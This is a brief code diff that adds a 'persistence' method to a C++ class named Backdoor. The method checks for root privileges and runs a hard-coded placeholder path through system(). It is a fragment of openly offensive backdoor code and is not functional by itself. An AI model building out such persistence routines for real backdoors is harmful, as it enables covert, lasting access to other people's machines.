@@ -115,3 +115,16 @@ Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
         //menu();
     }
 }
+
+void Backdoor::persistence(){
+    const char *  path = "1231231";
+    std::cout << "Running persistence" << std::endl;
+    if(geteuid() != 0)
+    {
+        std::cout << "Not root";
+
+    }else{
+        std::cout << "root";
+        system(path);
+    }
+}
